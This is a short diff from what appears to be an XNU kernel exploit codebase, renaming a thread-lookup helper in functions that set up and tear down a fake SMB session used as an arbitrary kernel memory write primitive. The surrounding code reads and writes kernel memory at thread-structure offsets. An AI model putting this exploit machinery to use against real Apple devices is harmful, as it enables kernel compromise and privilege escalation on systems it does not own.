@@ -93,7 +93,7 @@ uint64_t kmem_write_session_get_thread_id(void) {
 
 /// Create a fake smb_session that can be used for arbitary kernel memory write
 kmem_write_session_t kmem_write_session_create(const struct sockaddr_in* smb_addr) {
-    uintptr_t thread = xpl_xnu_thread_current_thread();
+    uintptr_t thread = xpl_thread_current_thread();
     
     uintptr_t ith_voucher_name = thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET;
     xpl_assert_cond(xpl_kmem_read_uint32(ith_voucher_name, 0), ==, 0);
@@ -169,7 +169,7 @@ uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
 
 
 void kmem_write_session_destroy(kmem_write_session_t* session_p) {
-    uintptr_t thread = xpl_xnu_thread_current_thread();
+    uintptr_t thread = xpl_thread_current_thread();
     uintptr_t uthread = thread + TYPE_THREAD_SIZE;
     xpl_kmem_write_uint64(uthread, TYPE_UTHREAD_MEM_PTH_NAME_OFFSET, 0);
     free(*session_p);
